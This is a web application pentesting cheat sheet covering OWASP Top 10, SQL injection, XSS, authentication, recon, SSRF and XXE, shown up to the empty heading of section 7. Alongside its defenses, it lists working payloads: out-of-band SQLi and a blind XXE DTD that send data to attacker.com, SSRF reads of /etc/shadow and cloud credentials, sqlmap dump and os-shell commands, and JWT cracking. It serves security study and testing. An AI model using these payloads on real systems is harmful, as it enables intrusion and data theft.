# Web Application Security Reference

> Professional cybersecurity reference library for web application penetration testing, secure development, and vulnerability research.

---

## Table of Contents

1. [OWASP Top 10 2021](#1-owasp-top-10-2021)
2. [SQL Injection Deep Dive](#2-sql-injection-deep-dive)
3. [XSS and Client-Side Attacks](#3-xss-and-client-side-attacks)
4. [Authentication and Session Security](#4-authentication-and-session-security)
5. [Web App Testing Methodology](#5-web-app-testing-methodology)
6. [SSRF and XXE](#6-ssrf-and-xxe)
7. [Business Logic and API Security](#7-business-logic-and-api-security)
8. [WAF and Defense Technologies](#8-waf-and-defense-technologies)
9. [Secure Development Practices](#9-secure-development-practices)
10. [Bug Bounty and Tool Reference](#10-bug-bounty-and-tool-reference)

---

## 1. OWASP Top 10 2021

### A01 Broken Access Control

Broken Access Control is the number one web application risk. It occurs when users can act outside of their intended permissions.

**Insecure Direct Object Reference (IDOR)**
- Attacker changes an object identifier (ID, filename, GUID) to access another user's data
- Test: change `user_id=123` to `user_id=124` in every parameter: body, query string, cookie, header
- Horizontal privilege escalation: access peer resources; vertical: access admin resources
- Tools: Burp Autorize extension auto-tests every request with a low-privilege session token

**Path Traversal**
- `../../../../etc/passwd` directory traversal to read arbitrary files
- URL-encoded variants: `..%2F..%2F..%2Fetc%2Fpasswd`, `..%252F` double-encoded
- Mitigation: canonicalize paths server-side, validate against allowed base directory

**CORS Misconfiguration**
- `Access-Control-Allow-Origin: *` with credentials exposes authenticated APIs
- Regex bypass: server trusts `evil.target.com` when checking for `target.com`
- Null origin abuse: sandboxed iframes emit `Origin: null`; if trusted, attacker-controlled data URI exploits it
- Test: send `Origin: https://attacker.com` and inspect response headers
- Secure: never reflect arbitrary Origin; never combine wildcard with allow-credentials true

**Forced Browsing**
- Access unlinked admin pages, backup files, configuration files
- Common targets: `/admin`, `/backup.zip`, `/.env`, `/phpinfo.php`, `/server-status`, `/.git/config`
- Tools: gobuster, ffuf, dirbuster with SecLists wordlists

**Access Control Testing Checklist**
- [ ] Test all object IDs in all HTTP methods (GET/POST/PUT/DELETE/PATCH)
- [ ] Test with no auth token, expired token, different user's token
- [ ] Test parameter pollution: `user_id=own&user_id=victim`
- [ ] Test HTTP method override: `X-HTTP-Method-Override: DELETE`
- [ ] Verify server-side role enforcement

---

### A02 Cryptographic Failures

**Weak Algorithms**
- Deprecated: MD5, SHA-1, DES, 3DES, RC4, RSA less than 2048-bit
- Current standard: AES-256-GCM, ChaCha20-Poly1305, RSA-2048+, SHA-256+
- TLS: require TLS 1.2 minimum; TLS 1.3 preferred; disable SSLv3, TLS 1.0, TLS 1.1

**Testing Tools**
- `testssl.sh --full https://target.com` comprehensive TLS/SSL assessment
- `sslyze --regular target.com:443` fast TLS scanner
- Check for: BEAST, POODLE, CRIME, BREACH, Heartbleed, ROBOT, DROWN vulnerabilities

**Hardcoded Credentials and Secrets**
- Grep source for: `password=`, `secret=`, `api_key=`, `BEGIN RSA`, `AWS_SECRET`
- Tools: TruffleHog, GitLeaks, detect-secrets for pre-commit scanning
- Use secret managers: AWS Secrets Manager, HashiCorp Vault, Azure Key Vault

---

### A03 Injection

**SQL Injection** - See Section 2 for deep dive.

**OS Command Injection**
- Vulnerable: `os.system(f"ping {user_input}")` inject `; cat /etc/passwd`
- Chaining: `;`, `&&`, `||`, `|`, backticks, `$()` subshell
- Prevention: use subprocess with list args; never shell=True

**LDAP Injection**
- Inject into LDAP filters: wildcards bypass authentication
- Payload: username `admin)(|(password=*)`
- Prevention: escape special characters per RFC 4515

**XPath Injection**
- `' or '1'='1` bypasses XML-based authentication
- Prevention: parameterized XPath queries

---

### A04 Insecure Design

**STRIDE Threat Modeling**
| Threat | Property Violated | Example |
|--------|------------------|---------|
| Spoofing | Authentication | Fake login as another user |
| Tampering | Integrity | Modify request parameters |
| Repudiation | Non-repudiation | Deny performing an action |
| Information Disclosure | Confidentiality | Leak internal data |
| Denial of Service | Availability | Exhaust API rate limits |
| Elevation of Privilege | Authorization | User to Admin |

**Design-Level Controls**
- Rate limiting on all authentication endpoints (lockout, CAPTCHA after N failures)
- Separate high-value operations (fund transfers require re-authentication)
- Business logic constraints at data layer, not just UI

---

### A05 Security Misconfiguration

**Common Misconfigurations**
- Default credentials: `admin:admin`, `admin:password`, vendor-specific defaults
- Verbose error messages exposing stack traces, SQL queries, internal paths
- Unnecessary features: directory listing, DEBUG mode, sample apps
- Missing security headers: CSP, HSTS, X-Frame-Options, X-Content-Type-Options
- Cloud: S3 bucket public access, open security groups, IMDSv1

**Testing Tools**
- `nikto -h https://target.com` web server misconfiguration scanner
- `nuclei -u https://target.com -t misconfigurations/` template-based detection
- `nuclei -u https://target.com -t exposures/` exposed files and panels

---

### A06 Vulnerable and Outdated Components

**Software Composition Analysis (SCA)**
- `snyk test` scan dependencies for known CVEs (npm, pip, Maven, Go, etc.)
- `grype image:latest` container image vulnerability scanning
- `trivy fs . --security-checks vuln` filesystem scan
- OWASP Dependency-Check: `dependency-check --scan ./`
- GitHub Dependabot: automated PR creation for vulnerable dependency updates

**Risk Assessment**
- CVSSv3 score 7.0 or higher: high priority remediation
- Check NVD (nvd.nist.gov), OSV (osv.dev), GitHub Advisory Database
- Scan full dependency tree including transitive dependencies

---

### A07 Identification and Authentication Failures

- Weak passwords: no complexity enforcement, no breach-check via HaveIBeenPwned API
- Credential stuffing: automated login with breached username:password pairs
- Missing MFA on admin/privileged accounts
- Insecure session tokens: predictable, short, or reused after logout
- Session fixation: server does not rotate session ID after authentication

**Testing Approach**
- Enumerate valid usernames via response differences (timing or message)
- Test account lockout bypass: IP rotation, case variation, username whitespace
- Verify MFA: replay OTP, skip MFA step via direct URL access
- Inspect session token entropy with Burp Sequencer

---

### A08 Software and Data Integrity Failures

**Insecure Deserialization**
- Java: gadget chains (ysoserial payloads) leading to RCE
- Python pickle: `pickle.loads(user_data)` arbitrary code execution
- PHP unserialize with magic methods: `__wakeup`, `__destruct`
- JWT: algorithm confusion, none algorithm bypass

**CI/CD Pipeline Security**
- Protect branch protections; require signed commits
- Pin GitHub Actions to commit SHA, not mutable tag
- Secret scanning: GitLeaks, truffleHog in pre-commit hooks
- SLSA framework for supply chain integrity

---

### A09 Security Logging and Monitoring Failures

**What Must Be Logged**
- All authentication events (success, failure, lockout)
- Access control failures (403s, unauthorized object access)
- Input validation failures (injection attempts, format violations)
- High-value transactions (financial, admin operations, data export)

**Log Quality Requirements**
- Timestamp (UTC), user identity, source IP, action taken, result
- Logs must be tamper-evident; ship to separate log aggregation system
- Alert on: login failures more than 5 per minute, impossible travel, privilege escalation

---

### A10 Server-Side Request Forgery (SSRF)

See Section 6 for comprehensive SSRF coverage.

**Quick Reference**
- Any user-controlled URL the server fetches is a potential SSRF vector
- Test all URL parameters, file upload endpoints, webhook configurations, PDF/image generators
- Primary impact: internal network scanning, cloud metadata theft, potential RCE

---
﻿## 2. SQL Injection Deep Dive

### Injection Types

**Union-Based SQLi**
- Requires same number of columns and compatible data types
- Discovery: `ORDER BY 1--`, `ORDER BY 2--`, continue until error to find column count
- Extraction: `UNION SELECT null,table_name,null FROM information_schema.tables--`
- Find string columns: replace nulls with `'a'` until no error

**Error-Based SQLi**
- MySQL: `EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))`
- MySQL: `UPDATEXML(1, CONCAT(0x7e, (SELECT database()), 0x7e), 1)`
- MSSQL: `CONVERT(int, (SELECT TOP 1 table_name FROM information_schema.tables))`

**Boolean-Based Blind SQLi**
- True: `' AND 1=1--` vs False: `' AND 1=2--`
- Extract char by char: `' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a'--`
- Binary search on ASCII value reduces requests by half per character

**Time-Based Blind SQLi**
- MySQL: `' AND IF(1=1, SLEEP(5), 0)--`
- MSSQL: `'; WAITFOR DELAY '0:0:5'--`
- PostgreSQL: `'; SELECT pg_sleep(5)--`
- Oracle: `' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--`

**Out-of-Band SQLi**
- MSSQL xp_dirtree: `EXEC master..xp_dirtree '\\attacker.com\file'`
- Oracle UTL_HTTP: `SELECT UTL_HTTP.REQUEST('http://attacker.com/'||user) FROM dual`

---

### SQLmap Usage Reference

**Basic Enumeration**
```bash
# Detect and enumerate databases
sqlmap -u "https://target.com/item?id=1" --dbs

# List tables in specific database
sqlmap -u "https://target.com/item?id=1" -D target_db --tables

# Dump specific table
sqlmap -u "https://target.com/item?id=1" -D target_db -T users --dump

# Dump specific columns only
sqlmap -u "https://target.com/item?id=1" -D target_db -T users -C username,password --dump
```

**Advanced Options**
```bash
# Increase detection sensitivity (slower)
sqlmap -u "https://target.com/item?id=1" --level=5 --risk=3

# Attempt OS shell (requires high privilege)
sqlmap -u "https://target.com/item?id=1" --os-shell

# Test all form fields automatically
sqlmap -u "https://target.com/login" --forms --batch

# Inject via cookie
sqlmap -u "https://target.com/dashboard" --cookie="session=abc123; user_id=1" -p user_id

# Rotate user agents
sqlmap -u "https://target.com/item?id=1" --random-agent

# WAF bypass with tamper scripts
sqlmap -u "https://target.com/item?id=1" --tamper=space2comment,between,randomcase

# POST request injection
sqlmap -u "https://target.com/login" --data="username=admin&password=test" -p username

# From Burp request file
sqlmap -r request.txt --level=3 --risk=2
```

**Common Tamper Scripts**
| Tamper | Purpose |
|--------|---------|
| `space2comment` | Replace spaces with `/**/` |
| `between` | Replace `>` with `NOT BETWEEN 0 AND` |
| `randomcase` | Random case on SQL keywords |
| `base64encode` | Base64 encode payload |
| `charencode` | URL encode all characters |
| `hex2char` | Convert hex strings to char functions |

---

### Database-Specific Syntax

| Feature | MySQL | PostgreSQL | MSSQL | Oracle |
|---------|-------|-----------|-------|--------|
| Version | `@@version` | `version()` | `@@version` | `v$version` |
| Current DB | `database()` | `current_database()` | `db_name()` | `(SELECT name FROM v$database)` |
| String concat | `CONCAT(a,b)` | `a\|\|b` | `a+b` | `a\|\|b` |
| Substring | `SUBSTR(s,1,1)` | `SUBSTR(s,1,1)` | `SUBSTRING(s,1,1)` | `SUBSTR(s,1,1)` |
| Comment | `--` or `#` | `--` | `--` | `--` |
| Stacked queries | Yes | Yes | Yes | No |
| Time delay | `SLEEP(5)` | `pg_sleep(5)` | `WAITFOR DELAY '0:0:5'` | `DBMS_PIPE.RECEIVE_MESSAGE('x',5)` |

---

### Second-Order (Stored) SQLi

- Payload stored safely (escaped) but later retrieved and used in an unsafe query without re-escaping
- Example: register username `admin'--` then profile page query concatenates it unsafely
- Testing: inject payloads in all stored fields; trigger via all retrieval paths

---

### ORM Edge Cases

- Django: `Model.objects.raw(f"SELECT * FROM table WHERE id={id}")` vulnerable despite ORM
- Hibernate HQL: string concatenation in createQuery is injectable
- SQLAlchemy: `session.execute(f"SELECT * FROM users WHERE id={id}")` vulnerable
- Safe: `session.execute(text("SELECT * FROM users WHERE id=:id"), {"id": id})`

---

### Prevention: Parameterized Queries

**Python psycopg2**
```python
# Safe parameterized query
cursor.execute("SELECT * FROM users WHERE username = %s", (username,))

# Safe named parameters
cursor.execute("SELECT * FROM users WHERE username = %(name)s", {"name": username})
```

**Java PreparedStatement**
```java
PreparedStatement stmt = conn.prepareStatement(
    "SELECT * FROM users WHERE username = ? AND password = ?"
);
stmt.setString(1, username);
stmt.setString(2, password);
ResultSet rs = stmt.executeQuery();
```

**PHP PDO**
```php
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = :username");
$stmt->execute(['username' => $username]);
$user = $stmt->fetch();
```

**Additional Defenses**
- Principle of least privilege: app DB user should not have DROP/ALTER rights
- Stored procedures (when they do not use dynamic SQL internally)
- Web Application Firewall as defense-in-depth (not primary control)
- Never expose database errors to end users

---
﻿## 3. XSS and Client-Side Attacks

### XSS Types

**Reflected XSS**
- Payload in request, reflected immediately in response
- Requires victim to click crafted link
- Test: inject `<script>alert(1)</script>` in all input parameters
- Higher severity when combined with CSRF or session hijacking

**Stored XSS**
- Payload persisted in database/filesystem, served to all users
- Test in: comments, profiles, usernames, titles, product descriptions, support tickets
- Impact: account takeover of all users who view the page including admins

**DOM-Based XSS**
- Payload processed by client-side JavaScript, never reaches server
- Sources: `location.hash`, `location.search`, `document.referrer`, `window.name`, `postMessage`
- Sinks: `innerHTML`, `outerHTML`, `document.write`, `eval`, `setTimeout(string)`, `src` assignment
- Find with: browser DevTools DOM breakpoints, DOMInvader (Burp), manual JS review

---

### Testing Methodology

**Initial Detection Payloads**
```
Basic script tag:   <script>alert(1)</script>
SVG onload:         <svg onload=alert(1)>
Image error:        <img src=x onerror=alert(1)>
Attribute break:    "><script>alert(1)</script>
```

**Context Analysis**
Identify where input is reflected:
- Between HTML tags: inject HTML/script tags
- Inside HTML attribute (quoted): close attribute, inject event handler
- Inside JavaScript string: close string, inject code
- Inside JavaScript template literal: inject `${alert(1)}`
- Inside URL attribute: `javascript:alert(1)`

**Filter Bypass Techniques**
```
Case variation:
  <ScRiPt>alert(1)</ScRiPt>

Event handlers when script tags blocked:
  <img src=x onerror="alert(1)">
  <svg/onload=alert(1)>
  <details/open/ontoggle=alert(1)>
  <input autofocus onfocus=alert(1)>
  <video src=1 onerror=alert(1)>

No quotes or spaces needed:
  <svg/onload=alert`1`>

HTML encoding bypass inside attribute:
  <a href="&#106;avascript:alert(1)">click</a>

SVG with embedded script:
  <svg><script>alert(1)</script></svg>

Data URI iframe:
  <iframe src="data:text/html,<script>alert(1)</script>">

Word filter bypass:
  <script>window['al'+'ert'](1)</script>
```

---

### Content Security Policy (CSP)

**Secure CSP Header**
```
Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'nonce-{random_per_request}';
  style-src 'self' 'nonce-{random_per_request}';
  img-src 'self' data: https:;
  object-src 'none';
  base-uri 'self';
  form-action 'self';
  frame-ancestors 'none';
  upgrade-insecure-requests;
  report-uri /csp-report-endpoint
```

**CSP Bypass Vectors**
- `unsafe-inline` present: CSP bypassed via inline scripts
- `unsafe-eval` present: bypass via `eval()`, `Function()`, `setTimeout(string)`
- Whitelisted CDN with user uploads: upload JSONP endpoint or Angular library
- Evaluate at: https://csp-evaluator.withgoogle.com

---

### Clickjacking Prevention

```
X-Frame-Options: DENY
X-Frame-Options: SAMEORIGIN
Content-Security-Policy: frame-ancestors 'none';
Content-Security-Policy: frame-ancestors 'self' https://trusted.com;
```

---

### CSRF

**Testing**
- Remove CSRF token: does request succeed?
- Use dummy CSRF token value: does request succeed?
- Change POST to GET: does action execute?
- Change Content-Type to text/plain: does CORS preflight apply?

**Prevention**
```
SameSite cookie (strongest defense):
  Set-Cookie: session=abc123; SameSite=Strict; Secure; HttpOnly

Double Submit Cookie pattern:
  Set-Cookie: csrf_token=<random>; SameSite=Strict
  Include same value in X-CSRF-Token header
```

---

### Subresource Integrity (SRI)

```html
<script src="https://cdn.example.com/jquery.min.js"
        integrity="sha384-<base64hash>"
        crossorigin="anonymous"></script>
```
Generate hash: `openssl dgst -sha384 -binary script.js | openssl base64 -A`

---

### Advanced Client-Side Attacks

**DOM Clobbering**
- HTML elements with `id` or `name` attributes override global JS variables
- `<form id="config"><input name="url" value="https://evil.com"></form>` clobbers `config.url`
- Leads to XSS when clobbered value flows to a dangerous sink

**Prototype Pollution**
- Pollute `Object.prototype` with attacker-controlled properties
- Payload: `{"__proto__": {"isAdmin": true}}` in JSON merge operations
- Test with: `?__proto__[polluted]=true` in query strings, JSON bodies
- Impact: property injection into all objects; potential RCE in Node.js via child_process spawning
- Detection: Burp extension Server-Side Prototype Pollution Scanner

**BeEF (Browser Exploitation Framework)**
- Hook victim browser via XSS-injected script tag pointing to hook.js
- Capabilities: keylogging, webcam access, network scanning, credential phishing
- Use in authorized penetration tests only to demonstrate XSS business impact

---
﻿## 4. Authentication and Session Security

### Username Enumeration

**Response Difference Enumeration**
- Different error messages: "Invalid username" vs "Invalid password"
- Different HTTP status codes or response lengths
- Timing differences: password hash computation only occurs for valid usernames

**Timing Attack**
- Valid username: server computes bcrypt hash (100-300ms)
- Invalid username: server returns immediately (less than 5ms)
- Mitigation: constant-time comparison; always compute hash even for invalid usernames

---

### Account Lockout Testing

```bash
# Test lockout threshold
for i in {1..20}; do
    curl -s -o /dev/null -w "%{http_code}\n" \
         -d "username=admin&password=wrong$i" \
         https://target.com/login
done

# Bypass techniques:
# 1. X-Forwarded-For header injection to rotate IPs
# 2. Username variation: admin vs Admin vs admin@domain.com
# 3. Password spray: 1 attempt per account across many accounts
# 4. Whitespace addition: "admin " vs "admin"
```

---

### MFA Bypass Techniques

- **Step skipping**: authenticate at `/login` then directly navigate to `/dashboard` bypassing `/mfa`
- **Token reuse**: OTP valid for longer than intended time window
- **Brute force**: 6-digit TOTP = 1,000,000 combinations; 4-digit PIN = 10,000
- **Response manipulation**: change `{"mfa_required": true}` to `false` in Burp
- **Race condition**: simultaneous requests may bypass sequential MFA check

---

### JWT Security

**JWT Tool Usage**
```bash
pip install jwt_tool

# Decode and display JWT
python3 jwt_tool.py <JWT_TOKEN>

# Test algorithm confusion (alg: none)
python3 jwt_tool.py <JWT> -X a

# Test RS256 to HS256 confusion
python3 jwt_tool.py <JWT> -S hs256 -k public.pem

# Tamper with claims
python3 jwt_tool.py <JWT> -T

# Crack weak secret via dictionary attack
python3 jwt_tool.py <JWT> -C -d /usr/share/wordlists/rockyou.txt
```

**Hashcat JWT Cracking**
```bash
# Mode 16500 = JWT HS256/HS384/HS512
hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
hashcat -m 16500 jwt.txt -a 3 ?a?a?a?a?a?a
```

**JWT Vulnerabilities**
| Vulnerability | Description | Test |
|--------------|-------------|------|
| alg: none | No signature validation | Change alg to none, remove signature |
| RS256 to HS256 confusion | Server validates HS256 with public key | Sign with RSA public key as HMAC secret |
| Weak secret | Brute-forceable HMAC key | hashcat -m 16500 |
| JWK injection | Embed attacker's public key in header | Include jwk header with self-signed key |
| kid injection | kid parameter used in SQL/file path lookup | SQLi or path traversal via kid |
| x5u/jku injection | Server fetches key from URL | Point to attacker-controlled key server |

---

### OAuth 2.0 Vulnerabilities

**State Parameter CSRF**
- If state param absent or not validated: attacker can initiate OAuth flow and bind victim account

**redirect_uri Manipulation**
- `redirect_uri=https://attacker.com` delivers authorization code to attacker
- Bypass via subdomain takeover, path traversal, or open redirect chaining on whitelisted domain

**Implicit Flow Token Leakage**
- Tokens returned in URL fragment, logged in browser history and server logs

**Authorization Code Interception**
- PKCE (Proof Key for Code Exchange) prevents authorization code theft in public clients

---

### SAML Vulnerabilities

**XML Signature Wrapping (XSW)**
- Move signed element; insert unsigned element with attacker-controlled attributes
- Tool: SAML Raider (Burp extension) for automated XSW testing

**Signature Stripping**
- Remove `<ds:Signature>` element; if server does not verify absence of signature: bypass

---

### Session Management

**Session Security Checklist**
- [ ] New session ID issued after login (prevent fixation)
- [ ] Session invalidated server-side on logout (not just cookie deletion)
- [ ] Session ID has sufficient entropy (128+ bits): test with Burp Sequencer
- [ ] HttpOnly flag prevents JavaScript access
- [ ] Secure flag prevents transmission over HTTP
- [ ] SameSite=Strict or Lax prevents CSRF via cookies
- [ ] Absolute timeout (8 hours) and idle timeout (30 minutes)

**Burp Sequencer Analysis**
```
1. Burp -> Sequencer -> select request with session token response
2. Define token location (cookie value or response body)
3. Start live capture (minimum 100 tokens for meaningful result)
4. Analyze -> look for FIPS bit-level entropy rating
5. Fail: anything below Excellent or predictable patterns
```

---

### Password Hashing

**Secure Algorithms**
| Algorithm | Recommended Parameters | Notes |
|-----------|----------------------|-------|
| Argon2id | m=65536, t=3, p=4 | OWASP first choice |
| bcrypt | cost 12 or higher | 72-byte input limit |
| scrypt | N=2^17, r=8, p=1 | Memory-hard |
| PBKDF2-SHA256 | 600,000 iterations | FIPS compliant |

**Never Use for Passwords**
- MD5, SHA-1, SHA-256/512 (unsalted or salted but fast)
- Plain text, base64, simple reversible encryption

```python
# bcrypt
import bcrypt
hashed = bcrypt.hashpw(password.encode(), bcrypt.gensalt(rounds=12))
is_valid = bcrypt.checkpw(password.encode(), hashed)

# Argon2id
from argon2 import PasswordHasher
ph = PasswordHasher(time_cost=3, memory_cost=65536, parallelism=4)
hashed = ph.hash(password)
ph.verify(hashed, password)
```

---
﻿## 5. Web App Testing Methodology

### Burp Suite Professional Complete Reference

**Core Workflow Setup**
```
1. Proxy -> Options -> set listener 127.0.0.1:8080
2. Install Burp CA cert -> browser proxy -> http://burp -> CA Certificate
3. Target -> Scope -> add target URL
4. Target -> Site map -> right-click -> Spider or use Crawler
5. Enable passive scanning via Dashboard
```

**Intruder Attack Types**
| Mode | Use Case | Example |
|------|----------|---------|
| Sniper | Single position, one wordlist | Password bruteforce |
| Battering Ram | Multiple positions, same payload | Username and CSRF token use same value |
| Pitchfork | Multiple positions, parallel wordlists | Username list paired with password list |
| Cluster Bomb | Multiple positions, all combinations | Full username x password bruteforce |

**Essential Burp Extensions**
| Extension | Purpose |
|-----------|---------|
| Autorize | Automatic access control testing with low-priv session |
| Param Miner | Discover hidden parameters via wordlist and response analysis |
| Active Scan++ | Additional checks: XXE, SSRF, prototype pollution |
| Turbo Intruder | High-speed requests for race conditions, password spraying |
| Logger++ | Enhanced request/response logging with grep rules |
| Collaborator Everywhere | Insert Burp Collaborator payloads in all headers |
| SAML Raider | SAML assertion manipulation |
| InQL | GraphQL security testing |
| JWT Editor | JWT manipulation and attack |

**Burp Collaborator for OOB Detection**
```
1. Burp -> Collaborator -> Copy to clipboard (get unique subdomain)
2. Use in payloads: http://burp-collab-id.oastify.com
3. Poll for interactions: DNS, HTTP, SMTP
4. Confirms: blind SSRF, blind XXE, blind SQLi OOB, blind command injection
```

---

### Reconnaissance

**Passive Recon (No Active Requests to Target)**
```bash
# Subdomain enumeration passive sources
subfinder -d target.com -o subdomains.txt
amass enum -passive -d target.com -o amass_passive.txt

# Certificate transparency logs
curl -s "https://crt.sh/?q=%.target.com&output=json" | jq -r '.[].name_value' | sort -u

# Historical URLs
waybackurls target.com | tee wayback.txt
gau target.com | tee gau.txt

# Google Dorks
site:target.com filetype:pdf
site:target.com inurl:admin
site:target.com "internal use only"
intitle:"target.com" inurl:login

# Shodan
shodan search hostname:target.com
shodan search "org:Target Company" http.status:200
```

**Active Recon**
```bash
# DNS bruteforce
amass enum -active -brute -d target.com -o amass_active.txt

# Resolve and check live hosts
cat subdomains.txt | httpx -status-code -title -tech-detect -o live_hosts.txt

# Directory and file bruteforce
gobuster dir -u https://target.com \
    -w /opt/SecLists/Discovery/Web-Content/raft-large-files.txt \
    -x php,aspx,jsp,html,txt,bak -o gobuster.txt

ffuf -w /opt/SecLists/Discovery/Web-Content/raft-large-directories.txt \
     -u https://target.com/FUZZ \
     -fc 403,404 -mc all -o ffuf.txt -of json

# Virtual host discovery
ffuf -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt \
     -u https://target.com -H "Host: FUZZ.target.com" \
     -fc 200 -fs <baseline_size>
```

---

### HTTP Security Header Assessment

**Required Headers**
```bash
# Quick check
curl -sI https://target.com | grep -iE "strict-transport|content-security|x-frame|x-content-type|referrer-policy"

# Comprehensive assessment
testssl.sh --headers https://target.com
# Graded: https://securityheaders.com or https://observatory.mozilla.org
```

**Header Reference**
| Header | Recommended Value | Protects Against |
|--------|------------------|-----------------|
| `Strict-Transport-Security` | `max-age=31536000; includeSubDomains; preload` | SSL stripping, downgrade |
| `Content-Security-Policy` | See Section 3 | XSS, data injection |
| `X-Frame-Options` | `DENY` | Clickjacking |
| `X-Content-Type-Options` | `nosniff` | MIME sniffing |
| `Referrer-Policy` | `strict-origin-when-cross-origin` | Referrer leakage |
| `Permissions-Policy` | `geolocation=(), camera=(), microphone=()` | Browser feature abuse |

---

### OWASP Testing Guide v4.2 Key Test Cases

**Information Gathering**
- OTG-INFO-001: Conduct Search Engine Discovery
- OTG-INFO-002: Fingerprint Web Server
- OTG-INFO-004: Enumerate Application on Webserver
- OTG-INFO-006: Identify Application Entry Points

**Authentication Testing**
- OTG-AUTHN-001: Test Credentials Transported over Encrypted Channel
- OTG-AUTHN-003: Test Account Lockout Mechanism
- OTG-AUTHN-004: Test Bypass Authentication Schema

**Authorization Testing**
- OTG-AUTHZ-001: Test Directory Traversal / File Include
- OTG-AUTHZ-002: Test Bypassing Authorization Schema
- OTG-AUTHZ-003: Test Privilege Escalation
- OTG-AUTHZ-004: Test Insecure Direct Object References

---

### JavaScript Analysis

**Endpoint Discovery**
```bash
# LinkFinder — extract endpoints from JS files
python3 linkfinder.py -i https://target.com/app.js -o cli

# SecretFinder — find API keys, tokens, credentials
python3 SecretFinder.py -i https://target.com/app.js -o cli

# Bulk analysis
cat gau.txt | grep "\.js$" | while read url; do
    python3 linkfinder.py -i "$url" -o cli 2>/dev/null
done | sort -u > endpoints.txt
```

**Source Map Analysis**
```bash
# Download source map and analyze with source-map-explorer
wget https://target.com/static/js/main.chunk.js.map
npm install -g source-map-explorer
source-map-explorer main.chunk.js main.chunk.js.map
```

---
﻿## 6. SSRF and XXE

### SSRF Server-Side Request Forgery

**Common SSRF Entry Points**
- URL parameters: `?url=`, `?redirect=`, `?src=`, `?href=`, `?link=`, `?path=`, `?proxy=`
- File paths: upload features that fetch remote content
- Webhook configurations: Slack/Discord/GitHub webhook URLs
- PDF generators: headless Chrome/wkhtmltopdf fetching user-supplied URLs
- Image processors: resize/optimize fetching remote images
- Import features: CSV/XML import from URL, OpenGraph preview fetchers

**SSRF Detection with Burp Collaborator**
```
1. Generate Collaborator payload: https://xxxx.oastify.com
2. Submit as URL parameter value
3. Check Collaborator for DNS/HTTP interaction
4. DNS-only = SSRF exists but HTTP filtered
5. HTTP interaction = full SSRF confirmed
```

---

### SSRF Payloads

**Internal Network Scanning**
```
http://127.0.0.1:22       SSH
http://127.0.0.1:80       HTTP
http://127.0.0.1:443      HTTPS
http://127.0.0.1:8080     alt HTTP
http://127.0.0.1:3306     MySQL
http://127.0.0.1:5432     PostgreSQL
http://127.0.0.1:6379     Redis
http://127.0.0.1:9200     Elasticsearch
http://127.0.0.1:2375     Docker API
http://127.0.0.1:10250    Kubernetes kubelet
http://10.0.0.0/8         internal RFC 1918
http://172.16.0.0/12      internal RFC 1918
http://192.168.0.0/16     internal RFC 1918
```

**Cloud Metadata Endpoints**
```bash
# AWS IMDSv1 (unauthenticated)
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/user-data
http://169.254.169.254/latest/dynamic/instance-identity/document

# AWS IMDSv2 (requires PUT token first)
# Step 1: PUT to get token with X-aws-ec2-metadata-token-ttl-seconds header
# Step 2: GET with X-aws-ec2-metadata-token header

# GCP metadata (requires Metadata-Flavor: Google header)
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# Azure metadata (requires Metadata: true header)
http://169.254.169.254/metadata/instance?api-version=2021-02-01

# DigitalOcean
http://169.254.169.254/metadata/v1/
```

**Protocol Handler Payloads**
```
file:///etc/passwd
file:///etc/shadow
file:///proc/self/environ
file:///var/www/html/.env
dict://127.0.0.1:6379/info          Redis enumeration
dict://127.0.0.1:6379/KEYS *        Redis key listing
gopher://127.0.0.1:6379/_INFO%0D%0A Redis command via gopher
gopher://127.0.0.1:25/...           SMTP via gopher
```

---

### SSRF Filter Bypass Techniques

**IP Representation Bypass**
```
Decimal:   http://2130706433/         represents 127.0.0.1
Octal:     http://0177.0.0.1/
Hex:       http://0x7f000001/
IPv6:      http://[::1]/
           http://[::ffff:127.0.0.1]/
DNS alias: http://localtest.me/       resolves to 127.0.0.1
```

**URL Parsing Confusion**
```
@ symbol:      http://attacker.com@127.0.0.1/
Fragment:      http://127.0.0.1#attacker.com
Open redirect: https://target.com/redirect?url=http://127.0.0.1:8080/admin
```

**DNS Rebinding**
1. Point attacker domain to legitimate IP (passes IP filter check)
2. TTL expires; re-resolve to 127.0.0.1
3. Server fetches again and hits internal address
- Tool: singularity.me for automated DNS rebinding

---

### SSRF to RCE via Redis

Via gopher:// protocol, send Redis commands:
1. FLUSHALL to clear database
2. SET key with cron job payload (reverse shell command)
3. CONFIG SET dir /var/spool/cron
4. CONFIG SET dbfilename root
5. BGSAVE to write cron file and achieve RCE

---

### XXE XML External Entity Injection

**Basic XXE**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root><data>&xxe;</data></root>
```

**Blind XXE via OOB (Out-of-Band)**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd">
  %remote;
]>
<root><data>&exfil;</data></root>
```

evil.dtd hosted on attacker server:
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % wrapper "<!ENTITY exfil SYSTEM 'http://attacker.com/?x=%file;'>">
%wrapper;
```

**XXE via Error Message**
```xml
<!DOCTYPE root [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
  %eval;
  %error;
]>
```

**XXE in File Uploads**
- SVG uploads: embed DOCTYPE in SVG XML
- XLSX/DOCX: ZIP archives containing XML; modify word/document.xml
- SAML requests: XML-based authentication flow

**XXE Prevention**
```java
// Java SAXParserFactory disable external entities
SAXParserFactory factory = SAXParserFactory.newInstance();
factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
factory.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
```

```python
# Python defusedxml (safe XML parsing)
import defusedxml.ElementTree as ET
tree = ET.parse(xmlfile)  # Blocks XXE by default
```

---
﻿## 7. Business Logic and API Security

